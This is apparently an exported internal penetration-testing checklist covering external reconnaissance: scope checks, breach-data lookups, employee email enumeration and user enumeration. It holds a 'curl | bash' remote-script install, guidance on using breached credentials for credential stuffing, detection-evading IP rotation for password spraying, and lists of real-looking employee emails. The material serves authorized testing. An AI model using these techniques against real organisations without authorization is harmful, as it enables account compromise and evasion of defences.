						"instructions": "<h2>Instructions</h2><p>Verify all domains discovery map back to in scope IP ranges prior to the start of testing.</p><h2>Variation: ClientChecker</h2><p>ClientChecker is a python script that compares domain/hostnames provided by the client to the in-scope IP list. This script takes the domain/hostname list, does an nslookup against the in-scope IPs, and outputs any inconsistencies. IPs must have their own line and no CIDR notation. Hostnames must have their own newline as well.</p><p>1. Download ClientChecker</p><pre><code>https://github.com/NetSPI/Scripts-Private/blob/master/ClientChecker</code></pre><h3>Example:</h3><pre><code>python clientchecker.py -d [file of hostnames] -i [file of IPs]</code></pre><p>Inscope IPs (ips.txt)</p><pre><code>10.2.21.40\n104.197.208.225\n10.2.21.2</code></pre><p>Domain Names that were enumerated (hosts.txt)</p><pre><code>correlatedvm.netspi.com\nftp.netspi.com\nabcd.netspi.com (no dns entry)\nsqlwiki.netspi.com (resolved IP not listed in in-scope IPs)</code></pre><p>Output:</p><pre><code><strong>python clientchecker.py -i ips.txt -d hosts.txt</strong>\n\nOut of scope hostnames:\nabcd.netspi.com -&gt; No associated IP address\nsqlwiki.netspi.com -&gt; 185.199.110.153\nsqlwiki.netspi.com -&gt; 185.199.109.153\nsqlwiki.netspi.com -&gt; 185.199.111.153\nsqlwiki.netspi.com -&gt; 185.199.108.153</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 14,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "030817d1-3470-41df-b329-fbda99ccbb94",
						"name": "Upload List of Domains/Subdomains [External Documents]",
						"instructions": "<h2>Instructions</h2><p>1. Upload a list of the enumerated Domains/Subdomains to the External Documents section of the Platform project.</p><p>2. Please place contents in a well labeled .csv or .xls document.</p><p>3. When possible include the IP, Domain, Subdomain and enumeration source. (and IP owner if you have it)</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 15,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d244df69-60d2-4ef2-981f-f0c0f4e30233",
						"name": "Additional OPTIONAL or PENDING items",
						"instructions": "<p>Additional options are available which may still be pending further review or testing; or may have account or API access requirements that has not been built into process yet. Also, these optional dynamic checklists may include testing instructions related to older technologies or data sets that are not often relevant in modern day-to-day process.<br><br>To add these items to the checklist, mark this task as vulnerable.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 16,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 4,
				"collapsed": true
			},
			{
				"uid": "cf935c11-bad8-4c11-a928-e3b00d035357",
				"name": "Reconnaissance: Employees",
				"description": "The goal of this task group is to identify employees, email addresses, and usernames that can be used in future attacks.",
				"type": 1,
				"tasks": [
					{
						"uid": "364a4a93-8aad-47b9-9631-4f891dbb637d",
						"name": "Employee - BreachDB [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Using known email domains, search for employee email addresses and potential passwords in breach data.</p><p><strong>NOTE: DO NOT</strong> use credentials discovered within the data breach sets to attempt to login to websites that aren't directly associated with the client. For example, if BreachDB contains user credentials that were part of the LinkedIn data breach, do not attempt to use those credentials to log in to LinkedIn's website as that user. The intent of these credentials is for credential stuffing and password guessing attacks against in-scope assets during an engagement.</p><h2>Variation: Automation with Invoke-BreachDB</h2><p>1. Navigate to https://github.com/NetSPI/PowerShell-Private/tree/master/BreachDB</p><p>2. Follow the instructions in the readme for setup and execution, but common commands have been listed below.</p><h3>Examples:</h3><pre><code>Invoke-BreachDB-Query -domain 'netspi.com' Invoke-BreachDB-Query -domain 'netspi.com' -source 'linkedin2016'\nInvoke-BreachDB-Query -email 'lee.buttke@netspi.com'</code></pre><h2>Variation: Manual Review Options</h2><p>1. Visit https://haveibeenpwned.com</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063363,
							"uid": "19ac44d2-633e-e811-80fe-ecf4bbd04073",
							"name": "Employee - Breach Data Identified",
							"description": "<p>It was possible to identify email address, usernames or credentials associated with potential employees by reviewing known data breach dumps.</p><p>These credentials may provide access to applications or augment success of attacks to gain access to the internal network. Additionally, even if no longer valid, identified credentials can provide an attacker insight into password patterns used by employees to increase success rate in brute force attacks.</p>",
							"severityId": -2,
							"businessImpact": "",
							"sourceIdentifier": "M:715b7b2c-0084-47c9-828a-888ec2ae4539",
							"verificationInstructions": "<h1>Instructions</h1><p>1. Using known email domains, search for employee email addresses and potential passwords in breach data.  </p><p>2. If breach data is found for employees add this finding.</p><p>3. In the verification, include a list of the identified employee names and the source of the database breach for each.  If the list is too long upload an spreadsheet to the Documents section of the Resolve project and reference it in the verification item and list the affected employee count.</p><p><strong>NOTE: DO NOT</strong> use credentials discovered within the data breach sets to attempt to login to websites that aren't directly associated with the client. For example, if BreachDB contains user credentials that were part of the LinkedIn data breach, do not attempt to use those credentials to log in to LinkedIn's website as that user.  The intent of these credentials is for credential stuffing and password guessing attacks against in-scope assets during an engagement.</p><h2>Variation: Automation with Invoke-BreachDB</h2><p>1. Navigate to https://github.com/NetSPI/PowerShell-Private/tree/master/BreachDB </p><p>2. Follow the instructions in the readme for setup and execution, but common commands have been listed below.  </p><p>Examples:</p><pre><code>Invoke-BreachDB-Query -domain 'netspi.com' Invoke-BreachDB-Query -domain 'netspi.com' -source 'linkedin2016' \nInvoke-BreachDB-Query -email 'lee.buttke@netspi.com'  </code></pre><h2>Variation: Manual Review Options</h2><p>1. Visit https://haveibeenpwned.com</p>",
							"references": "",
							"exploitInstructions": "<p>Use emails, usernames, and passwords found in the breach database to conduct follow up credentials stuffing and password guessing attacks against single factor management interfaces such as Citrix, VMware Horizon, Web based terminal services, Web application admin consoles, cloud platforms, and connected SaaS providers. Ensure that assets are in-scope before executing the attacks, and never test the credentials against third-party websites that are not explicitly part of the engagement.</p>",
							"remediationInstructions": "<p>Change the passwords to any accounts leaked publicly. Conduct training to teach employees of the dangers of information leaks, breached password data, and password reuse. Query any available logs for the affected accounts to identify if the credentials have previously been abused.</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7052eb45-391e-4316-8cda-170b13fca8bd",
						"name": "Employee - BBOT - Hunter.io [Commerical API] [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Enumerate known employees and emails. Using known email domains, search for employee email addresses using the https://hunter.io.</p><p>Refer to the Consultants - OSINT list in passwords for credentials/API key. </p><p><strong>Username:</strong> IT@NetSPI.com</p><p><strong>Password:</strong>  https://passwords.netspi.com/pid=20625</p><h3>Automation - BBOT</h3><h3>Install</h3><pre><code>$ pipx install bbot</code></pre><p>Alternatively, the latest version can be installed from source from the GitHub repository at <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/blacklanternsecurity/bbot\">https://github.com/blacklanternsecurity/bbot</a></p><h3>Configuration</h3><p>BBOT supports a large number of source providers to search for data. Some are included by default and require no special configuration to use, others require API keys configured in BBOT's <code>secrets.yaml</code> file. By default, this file is located (or can be created at) <code>$CONFIG/bbot/secrets.yaml</code>.</p><p>As of 2/5/2024, the following sources are permitted for commercial use and require signing up to obtain an API key:</p><ul><li><p>bevigil - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://bevigil.com/login\">https://bevigil.com/login</a></p></li><li><p>binaryedge - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://app.binaryedge.io/sign-up\">https://app.binaryedge.io/sign-up</a></p></li><li><p>chaos - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://chaos.projectdiscovery.io/#/\">https://chaos.projectdiscovery.io/#/</a></p></li><li><p>fullhunt - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://fullhunt.io/signup/\">https://fullhunt.io/signup/</a></p></li></ul><p>Signing up for API keys is not required, but does help return additional results. You can generally sign up with a personal email account or a dummy/throwaway account depending on your preference. Details about the configuration of the API keys in the BBOT tool can be found here: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.blacklanternsecurity.com/bbot/#installation\">https://www.blacklanternsecurity.com/bbot/#installation</a></p><p>These API keys are <strong>REQUIRED</strong>:</p><ul><li><p>github - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com\">https://github.com</a> (create a minimally-scoped, read-only API key for public repository searching)</p></li><li><p>hunterio (NetSPI has an account, check PasswordState)</p></li><li><p>dehashed (NetSPI has an account, check PasswordState)</p></li><li><p>shodan (NetSPI has an account, check PasswordState)</p></li></ul><h3>Execution Example</h3><p>The hunterio API key is required to run successfully. The email-enum or safe values can be used for the -f option. Safe will be more comprehensive but may include some out of scope data and will make active connections.</p><p><strong>Single Domain Target:</strong></p><pre><code><strong>$ bbot -t netspi.com -f email-enum -n netspi\n$ jq -r '. | select(.type==\"EMAIL_ADDRESS\") | select(.module==\"hunterio\") | .data' ~/.bbot/scans/netspi/output.ndjson | sort -u</strong>\naaron.shilts@netspi.com\nadolney@netspi.com\najones@netspi.com\nalex@netspi.com\naleybourne@netspi.com\nalice@netspi.com\nantti.rantasaari@netspi.com\nbob@netspi.com\n<strong>[TRUNCATED]</strong></code></pre><p><strong>File with List of Target Domains:</strong></p><pre><code><strong>$ bbot -t netspi-domains.txt -f email-enum -n netspi\n$ jq -r '. | select(.type==\"EMAIL_ADDRESS\") | select(.module==\"hunterio\") | .data' ~/.bbot/scans/netspi/output.ndjson | sort -u</strong>\naaron.shilts@netspi.com\nadolney@netspi.com\najones@netspi.com\nalex@netspi.com\naleybourne@netspi.com\nalice@netspi.com\nantti.rantasaari@netspi.com\nbob@netspi.com\n<strong>[TRUNCATED]</strong></code></pre><h3><strong>Automation - hunterio.py</strong></h3><p>1.  Install PyHunter</p><pre><code>pip install pyhunter</code></pre><p>2.  Insert Hunter API key into the script. A Hunter API key is required to use this tool.</p><p>The NetSPI API key that needs to be inserted into the script prior to use is:</p><p>https://passwords.netspi.com/pid=31032</p><pre><code># insert API key here\napiKey = ''\nhunter = PyHunter(apiKey)</code></pre><p>3. Run hunterio.py.</p><pre><code>$ python3 hunterio.py netspi.com\n\n[+] Found 10 email addresses for netspi.com domain:\n[-] Getting page 1 of results...\n[+] Discovered email addresses:\ncody.wass@netspi.com\ndavid.gordon@netspi.com\ngina.price@netspi.com\nalex@netspi.com\ngprice@netspi.com\nmary.braunwarth@netspi.com\nharold@netspi.com\nantti.rantasaari@netspi.com\ndavid.schlais@netspi.com\nkarl.fosaaen@netspi.com</code></pre><h3><strong>Hunterio.py Source Code</strong></h3><p><strong>Source:</strong> https://github.com/NetSPI/OSINT/tree/master/Hunter.io</p><pre><code>#!/usr/bin/python3\nimport argparse\nimport csv\nfrom pyhunter import PyHunter\nimport sys\n\n# insert API key here\napiKey = ''\nhunter = PyHunter(apiKey)\n\nparser = argparse.ArgumentParser(description='Search hunter.io for email addresses associated with a particular domain.')\nparser.add_argument('domain', metavar='D', help='an email domain name to search hunter.io for -- Ex: netspi.com')\nparser.add_argument('--outputPath', metavar='O', help='file to output CSV results -- Ex: /root/tools/myoutput.csv')\n\nargs = parser.parse_args()\n\nfinalEmailList = []\n\ndef queryAPI(domainVal, limitVal = 100, emails_typeVal = 'personal', offsetVal=0):\n  \"\"\"Calls the hunter.io API to search for email addresses for supplied domain\n\n  Args:\n    domainVal (string): Name of the domain to search -- Ex: netspi.com\n    limitVal (int): Maximum number of results to return per query (100 max)\n    emails_typeVal (string): 'personal' or 'generic' -- 'generic' includes\n    addresses like 'sales@netspi.com', whereas\n    'personal' only returns names of individuals\n    offsetVal (int): The number of emails to skip during a query\n  Returns:\n    bool: (dict): raw API response dictionary\n\n  \"\"\"\n  try:\n    return hunter.domain_search(domain=domainVal, limit=limitVal, emails_type=emails_typeVal, raw=True, offset=offsetVal).json()\n  except:\n   sys.exit(\"[x] ERROR: Failure during API search call to hunter.io. Check your API key.\")\n\n\n# iterate through the first set of results and store the emails\npageNum = 1\n\ntry:\n  apiResponse = queryAPI(args.domain)\n  emailCount = apiResponse['meta']['results']\nexcept:\n  sys.exit(\"[x] ERROR: Failure parsing JSON API response.\")\n\nif emailCount == 0:\n  sys.exit(\"[x] No email addresses found for {} domain.\".format(args.domain))\nelif emailCount == 1:\n  print(\"[+] Found 1 email address for {} domain:\".format(args.domain))\nelse:\n  print(\"[+] Found {} email addresses for {} domain:\".format(emailCount, args.domain))\n\nprint(\"[-] Getting page {} of results...\".format(pageNum))\nfor email in apiResponse['data']['emails']:\n  finalEmailList.append(email['value'])\n\npageNum += 1\n\n# if more than 100 emails exist, it requires paging through the results 100 at a time\nif emailCount &gt; 100:\n  offsetCount = 100\n\n  while emailCount &gt; offsetCount:\n    print(\"[-] Getting page {} of results...\".format(pageNum))\n    apiResponse = queryAPI(args.domain, offsetVal=offsetCount)\n    for email in apiResponse['data']['emails']:\n      finalEmailList.append(email['value'])\n\n    offsetCount += 100\n    pageNum += 1\n\nif args.outputPath:\n  # output final result set to CSV\n  print(\"[+] Writing output to {}\".format(args.outputPath))\n  try:\n    with open(args.outputPath, 'w', newline='') as f:\n      writer = csv.writer(f)\n      for email in finalEmailList:\n        writer.writerow([email])\n  except:\n    sys.exit(\"[x] ERROR: Could not write output file to {}\".format(args.outputPath))\nelse:\n  print(\"[+] Discovered email addresses:\")\n  for email in finalEmailList:\n    print(email)</code></pre><h2></h2>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063360,
							"uid": "f49e4a54-633e-e811-80fe-ecf4bbd04073",
							"name": "General Information - Employee - Hunter.io",
							"description": "<p>Employee information was found using Hunter.io.</p>",
							"severityId": -2,
							"businessImpact": "<p>An attacker maybe able to use valid employee names in future attacks.</p>",
							"sourceIdentifier": "M:56f52b52-9d53-42a9-943b-f64edd383938",
							"verificationInstructions": "<p><strong>Instructions</strong></p><p>Using known email domains, search for employee email addresses using the https://hunter.io. </p><p>Username: IT@NetSPI.com</p><p>Password:  https://passwords.netspi.com/pid=20625</p><p><strong>Automation</strong></p><p>1.  Install PyHunter </p><pre><code>pip install pyhunter</code></pre><p>2.  Insert Hunter API key into script A Hunter API key is required to use this tool. </p><p>The NetSPI API key that needs to be inserted into the script prior to use is:</p><p>https://passwords.netspi.com/pid=31032</p><pre><code>&#35; insert API key here\napiKey = ''\nhunter = PyHunter(apiKey)</code></pre><p>3. Run hunterio.py.</p><pre><code>$ python3 hunterio.py netspi.com\n[+] Found 10 email addresses for netspi.com domain:\n[-] Getting page 1 of results...\n[+] Discovered email addresses:\ncody.wass@netspi.com\ndavid.gordon@netspi.com\ngina.price@netspi.com\nalex@netspi.com\ngprice@netspi.com\nmary.braunwarth@netspi.com\nharold@netspi.com\nantti.rantasaari@netspi.com\ndavid.schlais@netspi.com\nkarl.fosaaen@netspi.com</code></pre><p><strong>Hunterio.py Source Code</strong></p><p>Source: https://github.com/NetSPI/OSINT/tree/master/Hunter.io</p><pre><code>&#35;!/usr/bin/python3\nimport argparse\nimport csv\nfrom pyhunter import PyHunter\nimport sys\n\n&#35; insert API key here\napiKey = ''\nhunter = PyHunter(apiKey)\n\nparser = argparse.ArgumentParser(description='Search hunter.io for email addresses associated with a particular domain.')\nparser.add_argument('domain', metavar='D', help='an email domain name to search hunter.io for -- Ex: netspi.com')\nparser.add_argument('--outputPath', metavar='O', help='file to output CSV results -- Ex: /root/tools/myoutput.csv')\n\nargs = parser.parse_args()\n\nfinalEmailList = []\n\n\ndef queryAPI(domainVal, limitVal = 100, emails_typeVal = 'personal', offsetVal=0):\n  &quot;&quot;&quot;Calls the hunter.io API to search for email addresses for supplied domain\n\n    Args:\n      domainVal (string): Name of the domain to search -- Ex: netspi.com\n      limitVal (int): Maximum number of results to return per query (100 max)\n      emails_typeVal (string): 'personal' or 'generic' -- 'generic' includes\n                               addresses like 'sales@netspi.com', whereas\n                               'personal' only returns names of individuals\n      offsetVal (int): The number of emails to skip during a query\n    Returns:\n      bool: (dict): raw API response dictionary\n\n  &quot;&quot;&quot;\n  try:\n    return hunter.domain_search(domain=domainVal, limit=limitVal, emails_type=emails_typeVal, raw=True, offset=offsetVal).json()\n  except:\n    sys.exit(&quot;[x] ERROR: Failure during API search call to hunter.io. Check your API key.&quot;)\n\n\n\n\n&#35; iterate through the first set of results and store the emails\npageNum = 1\n\ntry:\n  apiResponse = queryAPI(args.domain)\n  emailCount = apiResponse['meta']['results']\nexcept:\n  sys.exit(&quot;[x] ERROR: Failure parsing JSON API response.&quot;)\n\nif emailCount == 0:\n  sys.exit(&quot;[x] No email addresses found for {} domain.&quot;.format(args.domain))\nelif emailCount == 1:\n  print(&quot;[+] Found 1 email address for {} domain:&quot;.format(args.domain))\nelse:\n  print(&quot;[+] Found {} email addresses for {} domain:&quot;.format(emailCount, args.domain))\n\nprint(&quot;[-] Getting page {} of results...&quot;.format(pageNum))\nfor email in apiResponse['data']['emails']:\n  finalEmailList.append(email['value'])\n\npageNum += 1\n\n\n&#35; if more than 100 emails exist, it requires paging through the results 100 at a time\nif emailCount &gt; 100:\n  offsetCount = 100\n\n  while emailCount &gt; offsetCount:\n    print(&quot;[-] Getting page {} of results...&quot;.format(pageNum))\n    apiResponse = queryAPI(args.domain, offsetVal=offsetCount)\n    for email in apiResponse['data']['emails']:\n      finalEmailList.append(email['value'])\n\n    offsetCount += 100\n    pageNum += 1\n\n\nif args.outputPath:\n  &#35; output final result set to CSV\n  print(&quot;[+] Writing output to {}&quot;.format(args.outputPath))\n  try:\n    with open(args.outputPath, 'w', newline='') as f:\n      writer = csv.writer(f)\n      for email in finalEmailList:\n        writer.writerow([email])\n  except:\n    sys.exit(&quot;[x] ERROR: Could not write output file to {}&quot;.format(args.outputPath))  \nelse:\n  print(&quot;[+] Discovered email addresses:&quot;)\n  for email in finalEmailList:\n    print(email)</code></pre><p><strong>Report Verification</strong></p><p>Please add this finding to the workspace and add the discovered email addresses as a verification item.</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure employees are aware that their information being mad public may put them and their company at risk.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "234e4f56-d290-4840-a166-969df5b643b3",
						"name": "Employee - Dehashed [Commercial API] [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Enumerate known employees and emails. </p><p><strong>NOTE: DO NOT</strong> use credentials discovered within the data breach sets to attempt to login to websites that aren't directly associated with the client. For example, if Dehashed contains user credentials that were part of the LinkedIn data breach, do not attempt to use those credentials to log in to LinkedIn's website as that user.  The intent of these credentials is for credential stuffing and password guessing attacks against in-scope assets during an engagement.</p><h3>Automation - BBOT</h3><p><span style=\"color: red\"><strong>Note: Dehashed changed their API calls and BBOT has not been updated to work correctly. Instructions are kept here for future use, but do not rely on BBOT for Dehashed results currently. Scripts in ExPowerPen have been updated for Dehashed. (Updated July 25, 2025)</strong></span></p><h3>Install</h3><pre><code>$ pipx install bbot</code></pre><p>Alternatively, the latest version can be installed from source from the GitHub repository at <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/blacklanternsecurity/bbot\">https://github.com/blacklanternsecurity/bbot</a></p><h3>Configuration</h3><p>BBOT supports a large number of source providers to search for data. Some are included by default and require no special configuration to use, others require API keys configured in BBOT's <code>secrets.yaml</code> file. By default, this file is located (or can be created at) <code>$CONFIG/bbot/secrets.yaml</code>.</p><p>As of 2/5/2024, the following sources are permitted for commercial use and require signing up to obtain an API key:</p><ul><li><p>bevigil - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://bevigil.com/login\">https://bevigil.com/login</a></p></li><li><p>binaryedge - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://app.binaryedge.io/sign-up\">https://app.binaryedge.io/sign-up</a></p></li><li><p>chaos - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://chaos.projectdiscovery.io/#/\">https://chaos.projectdiscovery.io/#/</a></p></li><li><p>fullhunt - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://fullhunt.io/signup/\">https://fullhunt.io/signup/</a></p></li></ul><p>Signing up for API keys is not required, but does help return additional results. You can generally sign up with a personal email account or a dummy/throwaway account depending on your preference. Details about the configuration of the API keys in the BBOT tool can be found here: <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://www.blacklanternsecurity.com/bbot/#installation\">https://www.blacklanternsecurity.com/bbot/#installation</a></p><p>These API keys are <strong>REQUIRED</strong>:</p><ul><li><p>github - <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com\">https://github.com</a> (create a minimally-scoped, read-only API key for public repository searching)</p></li><li><p>hunterio (NetSPI has an account, check PasswordState)</p></li><li><p>dehashed (NetSPI has an account, check PasswordState)</p></li><li><p>shodan (NetSPI has an account, check PasswordState)</p></li></ul><h3>Execution Example</h3><p>The dehashed API key is required to run successfully. The email-enum or safe values can be used for the -f option. Safe will be more comprehensive but may include some out of scope data and will make active connections.</p><p><strong>Single Domain Target:</strong></p><pre><code><strong>$ bbot -t netspi.com -f email-enum -n netspi\n$ jq -r '. | select(.type==\"EMAIL_ADDRESS\") | select(.module==\"dehashed\") | .data' ~/.bbot/scans/netspi/output.ndjson | sort -u</strong>\naaron.shilts@netspi.com\nalex.crittenden@netspi.com\nanderson.rachel@netspi.com\nandrew.shea@netspi.com\nbrian.lawrence@netspi.com\nchris.rickert@netspi.com\nchris.secrest@netspi.com\nchris.slater@netspi.com\n<strong>[TRUNCATED]</strong></code></pre><p><strong>File with List of Target Domains:</strong></p><pre><code><strong>$ bbot -t netspi-domains.txt -f email-enum -n netspi\n$ jq -r '. | select(.type==\"EMAIL_ADDRESS\") | select(.module==\"dehashed\") | .data' ~/.bbot/scans/netspi/output.ndjson | sort -u</strong>\naaron.shilts@netspi.com\nalex.crittenden@netspi.com\nanderson.rachel@netspi.com\nandrew.shea@netspi.com\nbrian.lawrence@netspi.com\nchris.rickert@netspi.com\nchris.secrest@netspi.com\nchris.slater@netspi.com\n<strong>[TRUNCATED]</strong></code></pre><h2>Variation: Dehashed.com - Automated Process</h2><p>1. Download and install the tool from  <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/NetSPI/OSINT/tree/master/dehashed\"><u>https://github.com/NetSPI/OSINT/tree/master/dehashed</u></a></p><p>2.  Install the dehashed script.</p><pre><code> python -m pip install -r requirements.txt</code></pre><p>3. Run the command with the company information. Also, ensure you run it against all federated domains, managed domains, and email domains.</p><pre><code>python dehashed.py --company [COMPANYNAME] --domain [company.com]</code></pre><p>4. Recover the collected information from the sorted_emails.txt file and attach it to the Documents section of the relevant Resolve project. </p><p><strong>Note:</strong> The most current license and API key can be found at password.netspi.com under the \"DeHashed\" vaulted password.</p><h2>Variation: Dashed.com - Manual Process</h2><p>1. Visit https://dehashed.com/.</p><p>2. Grab the username and password from the \"DeHashed\" vaulted password from https://passwords.netspi.com (Consultants - OSINT list).</p><p>3. Login.</p><p>4. Search for credentials and users using in scope domains confirmed to support federated or managed authentication.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "88459ff5-7bb7-41cd-8aab-e8b4b08d5295",
						"name": "Employee - SimplyEmail",
						"instructions": "<h2>Instructions</h2><p>Enumerate known employees and emails.  </p><h2>Variation: SimplyEmail via Docker</h2><p>See Github for more info: </p><pre><code>https://github.com/SimplySecurity/SimplyEmail</code></pre><p>1. Download the docker container.</p><pre><code>root@kali:~&#35; docker pull simplysecurity/simplyemail</code></pre><p>2. Start the docker container.</p><pre><code>root@kali:~&#35; docker run --rm --entrypoint /bin/bash -ti simplysecurity/simplyemail</code></pre><p>3. Run the tool.</p><pre><code>./SimplyEmail.py -all -e domain.com</code></pre><h2>Variation: SimplyEmail</h2><p>1. Download and install the tools from https://github.com/SimplySecurity/SimplyEmail or use the version on Kali.</p><pre><code>git clone https://github.com/SimplySecurity/SimplyEmail.git</code></pre><p>2. Run the tool.</p><pre><code>./SimplyEmail.py -all -e example.com</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063362,
							"uid": "88e727ab-633e-e811-80fe-ecf4bbd04073",
							"name": "Employee - Simply Email",
							"description": "<p>Enumerate known employees and emails.</p><h2>Variation: Automation with SimplyEmail via Docker</h2><p>See Github for more info: https://github.com/SimplySecurity/SimplyEmail</p><pre><code>root@kali:~&#35; docker pull simplysecurity/simplyemail\nroot@kali:~&#35; docker run --rm --entrypoint /bin/bash -ti simplysecurity/simplyemail\n./SimplyEmail.py -all -e domain.com</code></pre><h2>Variation: Automation with SimplyEmail</h2><p>1. Download and install the tools from https://github.com/SimplySecurity/SimplyEmail or use the version on Kali.</p><pre><code>git clone https://github.com/SimplySecurity/SimplyEmail.git</code></pre><p>2. Run the tool.</p><pre><code>./SimplyEmail.py -all -e example.com</code></pre>",
							"severityId": -2,
							"businessImpact": "<p>NA</p>",
							"sourceIdentifier": "M:cd035f22-5c43-40ee-92fb-213929e0d3a8",
							"verificationInstructions": "<p><strong>Instructions</strong></p><p>Using known email domains, search for employee email addresses using the SimplyEmail.py script.  </p><p>1.  Download Simply email from https://github.com/SimplySecurity/SimplyEmail or clone the repository.</p><p>curl -s https://raw.githubusercontent.com/killswitch-GUI/SimplyEmail/master/setup/oneline-setup.sh | bash</p><p>pip install fake-useragent</p><p>cd SimplyEmail</p><p>2. Execute the command to obtain email addresses.</p><p>./SimplyEmail.py -all -e example.com</p><p><strong>Report Verification</strong></p><p>Please add this finding to the workspace and add the discovered email addresses as a verification item.</p><p><strong>Additional Notes</strong></p><p>None</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>NA</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2dfc4c4f-e51e-4f38-a34f-ef472085cba8",
						"name": "Employee - GatherContacts",
						"instructions": "<h2>Instructions</h2><p>Enumerate known employees and emails.</p><h2>Variation: Manual Review</h2><p><strong>Follow the setup and instructions from:</strong></p><pre><code>https://github.com/clr2of8/GatherContacts</code></pre><p><strong>Blog post outlining the tool/technique:</strong></p><pre><code>https://www.blackhillsinfosec.com/gathering-usernames-from-google-linkedin-results-using-burp-suite-pro/</code></pre><p>This Python script can take the output of the Burp plugin and parse into email addresses:</p><pre><code>https://github.com/NetSPI/Scripts-Private/blob/master/gathercontacts-parser.py</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7c94a815-2033-423b-a114-5ad9c2b1e820",
						"name": "Employee - Statistically Likely Usernames [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Enumerate valid emails using a list of statistically likely usernames and an email validation tool.</p><h3>Statistically Likely Username List</h3><p>Download the statistically likely username lists from GitHub: <a href='https://github.com/insidetrust/statistically-likely-usernames'>https://github.com/insidetrust/statistically-likely-usernames</a></p><h3>Identify Valid Users</h3><p><strong>CredMaster (https://github.com/knavesec/CredMaster)</strong></p><p><strong><em>General Information:</em></strong></p><p>CredMaster is the preferred tool for most password spraying scenarios. It contains a number of plugins that target different types of endpoints. It uses AWS Amazon API Gateway to randomize and rotate the origin IPs of the spraying traffic, making it more difficult for things like Azure Smart Lockout and other throttling detection engines to spot the password spray. </p><p>Some initial setup is required:</p><p>1. Create an IAM user in NetSPI's Services AWS account</p><p>2. Add the user to the ProxyGroup group</p><p>3. Generate an API key for the user and save the access key + secret access key in PasswordState</p><p>Once AWS API keys have been generated, they can be used on the command line when executing the tool.</p><p><strong><em>Plugin Information</em></strong></p><p>Suggested plugin commands are shown below, but the latest plugin information can always be obtained here: <a href='https://github.com/knavesec/CredMaster/wiki/Plugin-Overview'>https://github.com/knavesec/CredMaster/wiki/Plugin-Overview</a></p><p><em>O365Enum</em> <em>- Office365 User Enum</em></p><p>- Enumerates users on Managed Office365 instances using the &quot;login.microsoft.com&quot; URL method</p><p>- The script warns if throttling is detected</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin o365enum -u {username-file} -a useragents.txt -o {output-file} --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;</code></pre><p><em>GmailEnum- Gmail User Enumeration</em></p><p>- Enumerates users on GMail GSuite instances</p><p>- Suggested command:</p><pre><code>python3 credmaster.py --access_key {aws-access-key} --secret_access_key {aws-secret-access-key} --plugin gmailenum -u {username-file} -a useragents.txt -o {output-file} --header &quot;X-NetSPI-ExPen: expen.support@netspi.com&quot;</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "e1c146d9-2bfd-4162-9369-9b1e412ca095",
						"name": "Email Addresses - Determine Format",
